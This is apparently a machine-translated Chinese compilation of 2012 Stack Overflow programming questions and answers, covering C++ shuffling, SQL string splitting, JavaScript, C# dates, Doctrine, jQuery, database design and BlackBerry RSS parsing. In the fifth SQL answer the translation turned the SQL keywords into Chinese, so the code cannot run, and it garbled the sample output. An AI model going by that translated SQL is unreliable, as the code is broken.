> 
> 时间：2012-09-08T07:15:55.017

如果在 Firefox 上有效。那么问题是 chrome 上的 cookie，尝试清除 chrome 的 cookie。**

# c++ - 使用 rand() 洗牌，但没有洗牌发生

> ID：12328369
> 
> 赞同：2
> 
> 时间：2012-09-08T05:47:07.943
> 
> 标签：c++, algorithm, random, shuffle

我正在尝试使用 rand() 函数洗牌一副牌，但由于某种原因，当我试图查看洗牌后的牌组是什么样子时，它完全没有洗牌。我不确定我错过了什么，所以任何帮助将不胜感激。

```
void Deck::Shuffle()
{

for (int j = 0; j <= 51; j++)
{
    srand(time(0));
    int i = 1 + rand()%52;
    int k = 1 + rand()%52;

    Card temp = theDeck[i];
    theDeck[i] = theDeck[k];
    theDeck[k]= temp;
}
} 
```

编辑：谢谢大家的帮助。我已经修复了现在可以阅读的代码。

```
 void Deck::Shuffle()
{
srand(time(0));

for (int j = 0; j <= 51; j++)
{

    int i = 1 + rand()%52;
    int k = 1 + rand()%52;

    Card temp = theDeck[i];
    theDeck[i] = theDeck[k];
    theDeck[k]= temp;
}
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-08T05:48:57.547

`srand`每次程序执行只应调用一次，而不是每次调用`rand`. 由于当今计算机的速度，您的循环运行得如此之快，以至于您可能每次都获得相同的随机数，因为您不断使用相同的种子重置随机数生成器（时间，可能不会改变完全通过你的执行）。修复它。

更新：您的修复更好，但更好的是：

```
int main()
{
    srand(time(0));

    // the rest of your program here.
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T05:58:18.547

除了随机播种问题之外，您还可以使用该表达式`1 + rand()%52;`来计算您的交换指数。这会生成一个介于`1`和之间的数字`52`，这意味着您永远不会洗牌中的第一张牌，并且您会冒着修改数组边界之外的数据的风​​险。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T05:51:53.093

可能您的问题与反复和快速连续调用 srand 有关。

本质上，如果你调用它的速度足够快， time(0) 将返回相同的值，这意味着你播种 rand 的值将是相同的，这将在你的循环中为 rand 返回相同的值。尝试在 for 循环之前只调用 srand 一次。例如：

```
srand(time(0));

for (int j = 0; j <= 51; j++)
{
    int i = 1 + rand()%52;
    int k = 1 + rand()%52;

    Card temp = theDeck[i];
    theDeck[i] = theDeck[k];
    theDeck[k]= temp;
} 
```

# sql - 需要搜索包含的棘手 SQL 查询

> ID：12328370
> 
> 赞同：2
> 
> 时间：2012-09-08T05:47:09.793
> 
> 标签：sql, sql-server, sql-server-2008

我有这样的数据：

我表中的发明者列

```
Hundley; Edward; Ana
Isler; Hunsberger
Hunsberger;Hundley 
```

名称用 ; 分隔。我想编写一个汇总计数的 SQL 查询。

例如。结果应该是：

```
Hundley     2
Isler       1
Hunsberger  2
Edward      1
Ana         1 
```

我可以做一个分组，但这不是一个简单的分组，如你所见。关于如何获得此输出的任何想法/想法？

**编辑：**更改了结果，因此不会造成任何混淆，即一行仅包含 2 个名称。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:02:51.207

你可以看看这个。如果您有大量数据，我当然不推荐这种方式，但是您可以进行一些修改并使用它，它就像一个魅力！

这是支持无限拆分的新代码：

```
Declare @Table  Table   (
    Name    Nvarchar(50)
);

Insert  @Table  (
    Name
)   Select  'Hundley; Edward; Anna'
Union   Select  'Isler; Hunsberger'
Union   Select  'Hunsberger; Hundley'
Union   Select  'Anna'
;

With    Result  (
    Part
,   Remained
,   [Index]
,   Level
)   As  (
    Select  Case    When    CharIndex(';', Name, 1) =   0
            Then    Name
            Else    Left(Name, CharIndex(';', Name, 1) - 1)
        End
    ,   Right(Name, Len(Name) - CharIndex(';', Name, 1))
    ,   CharIndex(';', Name, 1)
    ,   1
        From    @Table
Union   All
    Select  LTrim(
        Case    When    CharIndex(';', Remained, 1) =   0
            Then    Remained
            Else    Left(Remained, CharIndex(';', Remained, 1) - 1)
        End
    )
    ,   Right(Remained, Len(Remained) - CharIndex(';', Remained, 1))
    ,   CharIndex(';', Remained, 1)
    ,   Level
    +   1
        From    Result
        Where   [Index] <>  0
)   Select  Part
    ,   Count(*)
        From    Result
        Group   By  Part 
```

干杯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:57:03.770

```
;with cte as  
( 
    select 1 as Item, 1 as Start, CHARINDEX(';',inventors, 1) as Split, Inventors from YourInventorsTable
    union all 
    select cte.Item+1, cte.Split+1, nullif(CHARINDEX(';',inventors, cte.Split+1),0), inventors as Split 
    from cte 
    where cte.Split<>0   
)    

select rTRIM(lTRIM(SUBSTRING(inventors, start,isnull(split,len(inventors)+1)-start))), count(*)
from cte  
group by rTRIM(lTRIM(SUBSTRING(inventors, start,isnull(split,len(inventors)+1)-start))) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T21:56:39.337

您可以创建一个[拆分函数](http://blog.logiclabz.com/sql-server/split-function-in-sql-server-to-break-comma-separated-strings-into-table.aspx)来拆分列值

```
select splittedValues.items,count(splittedValues) from table1
cross apply dbo.split(col1,';') splittedValues
group by splittedValues.items 
```

[Sql fiddle 中的 DEMO](http://sqlfiddle.com/#!3/90157/1)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-06T10:57:33.207

首先创建一个函数，将逗号或任何其他运算符（;）分隔的字符串放入一个表中，并使用该临时表，在该表上应用 GROUP 函数。

因此，您将获得单独价值的计数。

**"select d.number,count(*) from (select number from dbo.CommaseparedListToTable('Hundley;Edward;Ana;Isler;Hunsberger;Hunsberger;Hundley',';'))d group by d.number"**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-03-26T11:03:42.990

```

    声明@text nvarchar(255) = '爱德华; 亨德利；分析员；亨斯伯格; 亨斯伯格; 亨德利';
    声明@table table(id int identity,name varchar(50));

    而@text like '%;%'
    开始
    插入@table（名称）
    选择 SUBSTRING(@text,1,charindex(';',@text)-1)
    设置@text = SUBSTRING(@text, charindex(';',@text)+1,LEN(@text))
    结尾
    插入@table（名称）
    选择@文本
    select name , count(name) 从 @table group 按名称计数

```

**输出**

```
名字      计数 
分析员 1
亨德利 2
亨斯伯格 2
爱德华一世

```

# javascript - 创建要在其他函数中使用的全局变量

> ID：12328377
> 
> 赞同：0
> 
> 时间：2012-09-08T05:48:35.550
> 
> 标签：javascript, global-variables, javascript-objects

有人可以向我解释为什么'currentPos.LatLng'在我尝试在函数外部访问它时未定义，即使它是对象的一部分？基本上我试图能够获取我当前位置的值，以便我可以在另一个函数中再次使用它们。这东西很新……在此先感谢。

```
var map;
var infowindow;
var currentPos = {
};
var city = new google.maps.LatLng(60, -105);

function initialize() {
    map = new google.maps.Map(document.getElementById('map_canvas'), {
        mapTypeId: google.maps.MapTypeId.ROADMAP,
        center: city,
        zoom: 13
    });

    if(navigator.geolocation) {
        browserSupportFlag = true;
        navigator.geolocation.getCurrentPosition(
            function(position) {
                pos = new google.maps.LatLng(position.coords.latitude, position.coords.longitude);
                map.setCenter(pos);
                currentPos.LatLng = pos;
                console.log(currentPos.LatLng);
            }, 
            function() {
                handleNoGeolocation(true);
            }
        );          
    } else {
        handleNoGeolocation(false);
    }
    function handleNoGeolocation(errorFlag) {
        if (errorFlag) {
            var content = 'Error: The Geolocation service failed.';
        } else {
            var content = 'Error: Your browser doesn\'t support geolocation.';
        }
    }
    var request = {
                location: city,
                radius: 2500,
                types: ['store']
            };

    infowindow = new google.maps.InfoWindow();
    var service = new google.maps.places.PlacesService(map);
    service.search(request, callback);

    function callback(results, status) {
        if (status == google.maps.places.PlacesServiceStatus.OK) {
            for (var i = 0; i < results.length; i++) {
                createMarker(results[i]);
            }
        }
    }

    function createMarker(place) {
        var placeLoc = place.geometry.location;
        var marker = new google.maps.Marker({
            map: map,
            position: place.geometry.location
        });

        google.maps.event.addListener(marker, 'click', function() {
            infowindow.setContent(place.name);
            infowindow.open(map, this);
        });
    }
}

google.maps.event.addDomListener(window, 'load', initialize);   
console.log(currentPos.LatLng); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:50:03.723

因为`initialize`在您尝试记录它时尚未调用/完成。

您需要将它或您实际想要做的任何事情（或调用`currentPos`一旦填充后将访问的其他函数）移动到回调内部/在您分配它的位置之后。

# c# - 将 dd/MM/yyyy 转换为 MM/dd/YYYY

> ID：12328381
> 
> 赞同：11
> 
> 时间：2012-09-08T05:49:06.440
> 
> 标签：c#, date-formatting, date-conversion

我需要将“28/08/2012”转换为`MM/dd/YYYY`表示“08/28/2012”的格式。
我怎样才能做到这一点？

我正在使用下面的代码，但它向我抛出了异常。

```
DateTime.ParseExact("28/08/2012", "ddMMyyyy",  CultureInfo.InvariantCulture) 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-08T05:50:02.920

> 但它向我抛出了异常

**问题：**

您的日期包含`/`分隔符 ( `"28/08/2012"`) 并且您没有以日期字符串格式 ( `"ddMMyyyy"`) 给出它。

**解决方案：**

应该是`"dd/MM/yyyy"`。

这边走

```
DateTime.ParseExact("28/08/2012", "dd/MM/yyyy", CultureInfo.InvariantCulture)
                        .ToString("MM/dd/yyyy", CultureInfo.InvariantCulture); 
```

之后，我们将收到一个 DateTime 对象，其中包含您填充的日期，该对象使用`.ToString()`所需的日期格式`"MM/dd/yyyy"`和可选的文化信息传输到字符串`CultureInfo.InvariantCulture`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:40:47.557

由于您的原始日期在`en-GB`文化中，您可以创建一个对象并自然地`CultureInfo`解析您的。`DateTime`

```
string date = "28/08/2012";
System.Globalization.CultureInfo ci = System.Globalization.CultureInfo.CreateSpecificCulture("en-GB");
Convert.ToDateTime(date,ci.DateTimeFormat).ToString("d");//short date pattern 
```

（或者）

```
DateTime.Parse(date,ci.DateTimeFormat).ToString("d"); 
```

# php - 如何在 Doctrine ODM 和 MongoDbSessionHandler 之间共享 \Mongo 实例？

> ID：12328384
> 
> 赞同：1
> 
> 时间：2012-09-08T05:49:24.317
> 
> 标签：php, mongodb, symfony, dependency-injection, doctrine-odm

我正在尝试使用 MongoDB 来存储我的会话，并且我需要获取对`\Mongo`实例的引用。

但显然它没有被声明为服务。相反，教义从包装器中创建它。

那么我能做些什么呢？我试过这个：

```
services:
    mongo.connection:
        class: MongoDoctrine\MongoDB\Connection
        factory_service: doctrine.odm.mongodb.document_manager
        factory_method: getConnection
    mongo:
        class: Mongo
        factory_service: mongo.connection
        factory_method: getMongo 
```

但有时它返回 null，并且它还与我的将 request_id 添加到日志的记录器预处理器冲突，我认为这与会话有关。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-10T17:31:53.167

查看[Doctrine\MongoDB\Connection](https://github.com/doctrine/mongodb/blob/master/lib/Doctrine/MongoDB/Connection.php)的源代码，该`getMongo()`方法仅返回`$mongo`类属性，该属性可能已初始化，也可能未初始化。如果可能，您可以`initialize()`在注入连接之前手动调用。鉴于您已经为 Connection 包装器定义了一个服务，您应该能够做到这一点：

```
services:
    mongo.connection:
        class: Doctrine\MongoDB\Connection
        factory_service: doctrine.odm.mongodb.document_manager
        factory_method: getConnection
        calls:
            - [initialize, []]
    mongo:
        class: Mongo
        factory_service: mongo.connection
        factory_method: getMongo 
```

这将调用从其工厂方法`initialize()`构造服务的容器和它被返回之间的方法。`mongo.connection`

需要注意的一些额外点：

1.  如果`mongo.connection`只使用一次（注入`mongo`），您可能更喜欢使用匿名服务定义来代替定义另一个服务。
2.  ODM 捆绑包已经将每个连接定义为`doctrine_mongodb.odm.%s_connection`，使用配置中的名称代替`%s`; 但是，如果您需要将方法调用添加到服务定义中，这将无济于事。
3.  最新版本的 ODM 包（用于 Symfony 2.1+）将其服务前缀从 更改`doctrine.odm.mongodb`为`doctrine_mongodb.odm`，尽管默认文档管理器存在 BC 别名。不过，切换到新前缀是明智的。

# javascript - 是否可以在调用时动态设置 Jquery Accordion 的活动面板？

> ID：12328388
> 
> 赞同：0
> 
> 时间：2012-09-08T05:49:53.210
> 
> 标签：javascript, jquery, jquery-ui

我有一种情况，我从带有链接的主页中调用带有 Jquery Acoridon 的灰色框弹出窗口，并且想知道在调用它时是否可以为手风琴设置默认活动面板。

这是示例：

在我的主页中，这是 HTML：

```
<a href="example.php" id="1" onclick="return parent.GB_showCenter('Example.', this.href, 400, 600)" target="_blank">
Panel 1
</a>

<a href="example.php" id="2" onclick="return parent.GB_showCenter('Example.', this.href, 400, 600)" target="_blank">
Panel 2
</a>

<a href="example.php" id="3" onclick="return parent.GB_showCenter('Example.', this.href, 400, 600)" target="_blank">
Panel 3
</a> 
```

这是 example.php 上的 Javascript：

```
$(function() {
  $( "#acordion" ).accordion({ active: 0, collapsible: true, autoHeight: false }); 
```

这是 example.php 的 html 部分

```
<div id="acordion">
  <h3><a href="#">Panel 0</a></h3>
  <div>Do something @ Panel 1</div>

  <h3><a href="#">Panel 1</a></h3>
  <div>Do something @ Panel 2</div>

  <h3><a href="#">Panel 2</a></h3>
  <div>Do something @ Panel 3</div>

</div> 
```

我将面板 0 设置为默认活动面板，每当我打开该页面时，这都会将面板 0 作为活动面板打开。只想在使用链接 2 或链接 3 打开时将面板 1 或面板 2 设置为活动面板。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:53:19.807

您需要将默认面板值传递给页面，例如在 url 的哈希部分：

```
<a href="example.php#1" id="1" onclick="return parent.GB_showCenter('Example.', this.href, 400, 600)" target="_blank">
Panel 1
</a> 
```

然后只需使用 javascript: 阅读它`document.location.hash`，并将其用作手风琴的默认值。

```
$(function() {
   var hash = document.location.hash;
   $( "#acordion" ).accordion({ active: hash, collapsible: true, autoHeight: false });
}); 
```

# mysql - 数据库设计：用户和访客

> ID：12328391
> 
> 赞同：3
> 
> 时间：2012-09-08T05:49:58.420
> 
> 标签：mysql, sql, authentication, login, user-registration

我的网站上有两种类型的人，用户和访客。实际上它们是相同的，除了创建/验证过程。

目前我有两张桌子：

```
t_users

userId[PRIMARY, AUTOINC] username[UNIQUE]

t_guests

guestId[PRIMARY, AUTOINC] userId 
```

当有人进入站点时，脚本会执行以下操作：

1) 通过向 t_guests 插入新行来创建新的访客记录

2) 使用上一步生成的 guestId 将新记录添加到 t_users (guest username = “Guest guestId”)

3) 更新在步骤 2 中分配的访客记录设置 userId

我觉得这种数据库设计很糟糕，因为它包含许多漏洞。例如，如果用户名“Guest xyz”已存在于 t_users 表中，则步骤 2 将失败，步骤 3 将为 userId 分配错误的值（取决于实现，它将是 0 或 guestId，在步骤 1 中分配）。

实际上，我只需要 t_guests 表的自动增量功能来为客人生成唯一的用户名。有没有办法只使用一个合并表并使用单个查询注册客人？

**更新：**我可以执行以下操作在单个表中插入客人：

```
SELECT @mg := IFNULL(MAX(guestId), 0) + 1 FROM t_users;

INSERT INTO t_users (guestId) VALUES(@mg); 
```

但我不能确定，在这两个语句的执行之间，没有人在 t_users 中插入新的访客记录。而且我不能让 guestId 唯一，因为真实用户会将它设为零。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:03:50.510

如果您只有 1 个带有“用户 ID、用户名、类型”的表

对于用户名，您可以使用脚本生成 Guid 并将其用作用户名或其他随机变量。如果您使用 GUID，则几乎不可能有 2 个 guid 发生冲突。

此外，如果您确实有 2 个用户名发生冲突，如果您确保用户名列必须是唯一的，那么插入将失败，您可以再试一次。

你绝对不能在这里只有一张桌子。

# java - BlackBerry 中的 RSS / XML 解析

> ID：12328396
> 
> 赞同：1
> 
> 时间：2012-09-08T05:50:19.447
> 
> 标签：java, blackberry, java-me

我正在开发一个 RSS 阅读器应用程序，我需要在其中读取和显示部分数据。仅需要从从 url 获取的数据中提取数据，**`title`**https [://twitter.com/statuses/user_timeline/27756405.rss](https://twitter.com/statuses/user_timeline/27756405.rss)。**`link`**

我在解析 xml 时遇到问题，在这个问题上需要帮助。

我的代码附在下面。

```
public class RssMain extends UiApplication {
    RssMain theApp;

    public static void main(String[] args) {
        // create an instance of our app
        RssMain theApp = new RssMain();
        // "run" the app
        theApp.enterEventDispatcher();
    }

    // app constructor
    public RssMain() {
        // create an instance of the main screen of our application
        RssScreen screen = new RssScreen();
        // make the screen visible
        UiApplication.getUiApplication().pushScreen(screen);
    }

    class RssScreen extends MainScreen {

        public RssScreen() {
            String rssUrl = "http://twitter.com/statuses/user_timeline/27756405.rss";
            String[][] urlData = RSSHandler.getURLFromRSS(rssUrl);
            for (int i = 0; i < urlData.length; i++) {
                String title = urlData[0][i];
                String url = urlData[1][i];
                System.out.println("TITLE " + title);
                System.out.println("URL " + url);

            }
        }
    }
} 
```

***RSSHandler的实现***

```
import java.io.IOException;
import java.io.InputStream;
import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import net.rim.blackberry.api.browser.Browser;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.util.Arrays;
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

class RSSHandler extends DefaultHandler {
    boolean isItem = false;
    boolean isTitle = false;
    boolean isLink = false;
    String[] title = new String[] {};
    String[] link = new String[] {};
    String value = "";

    public void startElement(String uri, String localName, String name, Attributes attributes) throws SAXException {
        if (!isItem) {
            if (name.equalsIgnoreCase("item"))
                isItem = true;
        } else {
            if (name.equalsIgnoreCase("title"))
                isTitle = true;
            if (name.equalsIgnoreCase("link"))
                isLink = true;
        }
    }

    public void characters(char[] ch, int start, int length) throws SAXException {
        if (isTitle || isLink) {
            value = value.concat(new String(ch, start, length));
        }
    }

    public void endElement(String uri, String localName, String name) throws SAXException {
        if (isItem && name.equalsIgnoreCase("item")) {
            isItem = false;
        }
        if (isTitle && name.equalsIgnoreCase("title")) {
            isTitle = false;
            Arrays.add(title, value);
            value = "";
        }
        if (isLink && name.equalsIgnoreCase("link")) {
            isLink = false;
            Arrays.add(link, value);
            value = "";
        }
    }

    public static String[][] getURLFromRSS(String url) {
        InputStream is = null;
        HttpConnection connection = null;
        RSSHandler rssHandler = new RSSHandler();
        try {
            connection = (HttpConnection) Connector.open(url);
            is = connection.openInputStream();
            try {
                SAXParser parser = SAXParserFactory.newInstance().newSAXParser();
                parser.parse(is, rssHandler);
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
            } catch (SAXException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (is != null)
                    is.close();
                if (connection != null)
                    connection.close();

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        String[][] result = new String[2][];
        result[0] = rssHandler.title;
        result[1] = rssHandler.link;
        return result;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T08:43:59.633

我使用与您的原理几乎相同的原理构建了一个非常粗糙的应用程序，并且它正确地从以下位置加载数据：http: [//twitter.com/statuses/user_timeline/27756405.rss](http://twitter.com/statuses/user_timeline/27756405.rss)

请记住，这只是一个非常粗略的编辑。我目前无法访问黑莓开发工具，因此我已将其转换为独立的 Java 应用程序，但如果您将其更改为适合您的黑莓应用程序，它应该可以正常工作。请注意 parseRssData 方法中从 HttpConnection 到 URL 的切换，对于黑莓，您可能必须将其切换回。

主程序

```
public class RssMain {
    public static final String DEFAULT_URL = "http://twitter.com/statuses/user_timeline/27756405.rss";

    public static void main( String[ ] args ) {
        RssItem[ ] items = parseRssData( DEFAULT_URL );
        for( RssItem item : items ) System.out.println( "Title: " + item.title( ) + " | Link: " + item.link( ) );
    }

    public static RssItem[ ] parseRssData( String url ) {
        URL u;
        InputStream in = null;
        RssHandler handler = new RssHandler( );

        try {
            u = new URL( url );
            in = u.openStream( );

            SAXParser parser = SAXParserFactory.newInstance( ).newSAXParser( );
            parser.parse( in, handler );
        } catch( Exception cause ) {
            cause.printStackTrace( );
        }

        return handler.items.toArray( new RssItem[ 0 ] );
    }
} 
```

RssHandler

```
public class RssHandler extends DefaultHandler {
    public final ArrayList< RssItem > items;

    private boolean isItem = false;
    private boolean isTitle = false;
    private boolean isLink = false;

    String value = "";
    RssItem current = null;

    public RssHandler( ) {
        items = new ArrayList< RssItem >( );
    }

    @Override
    public void startElement( String uri, String localName, String name, Attributes attributes ) throws SAXException {
        if( !isItem  && name.equalsIgnoreCase( "item" ) ) isItem = true;
        else {
            if( name.equalsIgnoreCase( "title" ) ) isTitle = true;
            if( name.equalsIgnoreCase( "link" ) ) isLink = true;
        }
    }

    @Override
    public void endElement( String uri, String localName, String name ) {
        if( isItem && name.equalsIgnoreCase( "item" ) ) isItem = false;
        else if( isTitle || isLink ) {
            if( current == null ) current = new RssItem( );

            if( name.equalsIgnoreCase( "title" ) ) {
                isTitle = false;
                current.title( value );
            } else if( name.equalsIgnoreCase( "link" ) ) {
                isLink = false;
                current.link( value );
            }

            value = "";
            if( ( current.title( ) != null ) && ( current.link( ) != null ) ) {
                items.add( current );
                current = null;
            }
        }
    }

    @Override
    public void characters( char[ ] chars, int start, int length ) throws SAXException {
        if( isTitle || isLink ) value = value.concat( new String( chars, start, length ) );
    }
} 
```

RssItem

```
public class RssItem {
    private String title;
    private String link;

    public String title( ) {
        return title;
    }

    public RssItem title( String title ) {
        this.title = title;
        return this;
    }

    public String link( ) {
        return link;
    }

    public RssItem link( String link ) {
        this.link = link;
        return this;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T08:59:36.437

这个答案基于这篇文章，[如何在 Java 中读取 XML 文件 - (DOM Parser)](http://www.mkyong.com/java/how-to-read-xml-file-in-java-dom-parser/)。

下面添加了完整 BlackBerry 应用程序的源代码，该应用程序从此处读取、解析和显示数据，[https://twitter.com/statuses/user_timeline/27756405.rss](https://twitter.com/statuses/user_timeline/27756405.rss)。

### 数据样本：

```
<?xml version="1.0" encoding="UTF-8"?>
<rss xmlns:georss="http://www.georss.org/georss" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:twitter="http://api.twitter.com">
  <channel>
    <title>Twitter / LPProjekt</title>
    <link>http://twitter.com/LPProjekt</link>
    <atom:link type="application/rss+xml" rel="self" href="https://twitter.com/statuses/user_timeline/27756405.rss"/>
    <description>Twitter updates from Linkin Park Projekt / LPProjekt.</description>
    <language>en-us</language>
    <ttl>40</ttl>
  <item>
    <title>LPProjekt: LPP PSA: LPU will now cost a ridiculous $10/month ...</title>
    <description>LPProjekt: LPP PSA: LPU will now cost a ridiculous $10 ...</description>
    <pubDate>Thu, 19 Aug 2010 06:15:08 +0000</pubDate>
    <guid>http://twitter.com/LPProjekt/statuses/21555230077</guid>
    <link>http://twitter.com/LPProjekt/statuses/21555230077</link>
    <twitter:source>&lt;a href=&quot;http://www.digsby.com/?utm_campaign=twitter&quot; rel=&quot;nofollow&quot;&gt;Digsby&lt;/a&gt;</twitter:source>
    <twitter:place/>
  </item>
  <item>
    <title>LPProjekt: the instrumental from &quot;what ive done&quot; was j ...</title>
    <description>LPProjekt: the instrumental from &quot;what ive done&quot;  ...</description>
    <pubDate>Sun, 07 Feb 2010 23:34:26 +0000</pubDate>
    <guid>http://twitter.com/LPProjekt/statuses/8784251683</guid>
    <link>http://twitter.com/LPProjekt/statuses/8784251683</link>
    <twitter:source>&lt;a href=&quot;http://www.tweetdeck.com/&quot; rel=&quot;nofollow&quot;&gt;TweetDeck&lt;/a&gt;</twitter:source>
    <twitter:place/>
  </item>
  <item>
    <title>LPProjekt: a preview of the new linkinpark.com is now available ...</title>
    <description>LPProjekt: a preview of the new linkinpark.com is now  ...</description>
    <pubDate>Fri, 08 Jan 2010 22:20:53 +0000</pubDate>
    <guid>http://twitter.com/LPProjekt/statuses/7534555135</guid>
    <link>http://twitter.com/LPProjekt/statuses/7534555135</link>
    <twitter:source>&lt;a href=&quot;http://www.tweetdeck.com/&quot; rel=&quot;nofollow&quot;&gt;TweetDeck&lt;/a&gt;</twitter:source>
    <twitter:place/>
  </item>
  </channel>
</rss> 
```

### 示例代码

```
package mypackage;

import java.io.IOException;
import java.io.InputStream;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.SeparatorField;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;
import net.rim.device.api.xml.parsers.DocumentBuilder;
import net.rim.device.api.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class MyApp extends UiApplication {

    public static void main(String[] args) {
        (new MyApp()).enterEventDispatcher();
    }

    public MainScreen screen = new MainScreen();

    public MyApp() {
        pushScreen(screen);
        (new Connection()).start();
    }

    private class Connection extends Thread {
        private Vector listElements = new Vector();
        private static final String RSS_FEED_URL = "https://twitter.com/statuses/user_timeline/27756405.rss";
        private static final String CONNECTION_PARAMS = ";deviceside=true";

        public void run() {
            StreamConnection conn = null;
            InputStream is = null;
            try {
                conn = (StreamConnection) Connector.open(RSS_FEED_URL + CONNECTION_PARAMS);

                DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();
                docBuilderFactory.setIgnoringElementContentWhitespace(true);
                docBuilderFactory.setCoalescing(true);
                DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();
                is = conn.openInputStream();
                Document doc = docBuilder.parse(is);
                doc.getDocumentElement().normalize();

                NodeList itemNodeList = doc.getElementsByTagName("item");
                for (int index = 0; index < itemNodeList.getLength(); index++) {
                    Node nNode = itemNodeList.item(index);
                    if (nNode.getNodeType() == Node.ELEMENT_NODE) {
                        Element itemElement = (Element) nNode;

                        // Extract desired data here
                        System.out.println("title : " + getTagValue("title", itemElement));
                        System.out.println("description : " + getTagValue("description", itemElement));
                        System.out.println("pubDate : " + getTagValue("pubDate", itemElement));
                        System.out.println("guid : " + getTagValue("guid", itemElement));
                        System.out.println("link : " + getTagValue("link", itemElement));

                        listElements.addElement(getTagValue("title", itemElement));
                        listElements.addElement(getTagValue("link", itemElement));
                    }
                }

            } catch (Exception e) {
            } finally {
                if (is != null) { try { is.close(); } catch (IOException ignored) { } }
                if (conn != null) { try { conn.close(); } catch (IOException ignored) { } }
            }

            showData();
        }

        private String getTagValue(String sTag, Element eElement) {
            NodeList nlList = eElement.getElementsByTagName(sTag).item(0).getChildNodes();
            Node nValue = (Node) nlList.item(0);
            return nValue.getNodeValue();
        }

        private void showData() {
            UiApplication.getUiApplication().invokeLater(new Runnable() {
                public void run() {
                    for (int i = 0; listElements != null && i < listElements.size(); i += 2) {
                        VerticalFieldManager vfm = new VerticalFieldManager();
                        vfm.setMargin(10, 10, 10, 10);
                        vfm.add(new LabelField("Item no. " + ((i / 2) + 1)));
                        vfm.add(new LabelField("Title: " + listElements.elementAt(i)));
                        vfm.add(new LabelField("Link: " + listElements.elementAt(i + 1)));
                        vfm.add(new SeparatorField( SeparatorField.LINE_HORIZONTAL));

                        screen.add(vfm);
                    }
                    screen.invalidate();
                }
            });
        }
    }
} 
```

### 模拟器中的输出

> ![模拟器中的输出](../Images/574e49e94337373eabe1c274fdde8a3b.png "模拟器中的输出")

# jquery - 倒数计时器，需要将天转换为小时

> ID：12328406
> 
> 赞同：0
> 
> 时间：2012-09-08T05:52:52.373
> 
> 标签：jquery, timer, countdown

我有一个带有天、小时、分钟和秒的倒计时计时器。我想删除天数。需要将天数转换为小时数。

我尝试自己做，但由于缺乏知识而没有成功。

```
 (function(){
    $.fn.lofCountDown = function( options ) {
        return this.each(function() { 
            // get instance of the lofCountDown.
            new  $.lofCountDown( this, options ); 
        });
     }
    $.lofCountDown = function( obj, options ){
        this.options = $.extend({
                autoStart           : true,
                LeadingZero:true,
                DisplayFormat:"<div>%%D%% Days</div><div>%%H%% Hours</div><div>%%M%% Minutes</div><div>%%S%% Seconds</div>",
                FinishMessage:"Expired",
                CountActive:true,
                TargetDate:null
        }, options || {} );
        if( this.options.TargetDate == null || this.options.TargetDate == '' ){
            return ;
        }
        this.timer  = null;
        this.element = obj;
        this.CountStepper = -1;
        this.CountStepper = Math.ceil(this.CountStepper);
        this.SetTimeOutPeriod = (Math.abs(this.CountStepper)-1)*1000 + 990;
        var dthen = new Date(this.options.TargetDate);
        var dnow = new Date();
        if( this.CountStepper > 0 ) {
            ddiff = new Date(dnow-dthen);
        }
        else {
             ddiff = new Date(dthen-dnow);
        }
        gsecs = Math.floor(ddiff.valueOf()/1000); 
        this.CountBack(gsecs, this);
    };
     $.lofCountDown.fn =  $.lofCountDown.prototype;
     $.lofCountDown.fn.extend =  $.lofCountDown.extend = $.extend;
     $.lofCountDown.fn.extend({
        calculateDate:function( secs, num1, num2 ){
              var s = ((Math.floor(secs/num1))%num2).toString();
              if ( this.options.LeadingZero && s.length < 2) {
                    s = "0" + s;
              }
              return "<b>" + s + "</b>";
        },
        CountBack:function( secs, self ){
             if (secs < 0) {
                self.element.innerHTML = '<div class="lof-labelexpired"> '+self.options.FinishMessage+"</div>";
                return;
              }
              clearInterval(self.timer);
              DisplayStr = self.options.DisplayFormat.replace(/%%D%%/g, self.calculateDate( secs,86400,100000) );
              DisplayStr = DisplayStr.replace(/%%H%%/g, self.calculateDate(secs,3600,24));
              DisplayStr = DisplayStr.replace(/%%M%%/g, self.calculateDate(secs,60,60));
              DisplayStr = DisplayStr.replace(/%%S%%/g, self.calculateDate(secs,1,60));
              self.element.innerHTML = DisplayStr;
              if (self.options.CountActive) {
                   self.timer = null;
                 self.timer =  setTimeout( function(){
                    self.CountBack((secs+self.CountStepper),self);          
                },( self.SetTimeOutPeriod ) );
             }
